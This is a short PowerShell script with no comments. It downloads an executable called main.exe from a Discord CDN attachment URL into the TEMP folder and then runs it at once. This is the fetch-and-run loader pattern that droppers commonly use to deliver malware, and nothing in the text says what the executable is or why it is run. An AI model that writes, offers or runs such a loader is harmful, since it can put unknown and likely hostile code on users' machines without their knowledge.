$url = "https://cdn.discordapp.com/attachments/1239366779504164935/1241441323471605851/main.exe?ex=664a35d4&is=6648e454&hm=d292600e391d19e06dc642973b91e84bc04bf48345b1624332e959ebb9afb1af&"
$file = Join-Path $env:TEMP "main.exe"
Invoke-WebRequest -Uri $url -OutFile $file
Start-Process $file
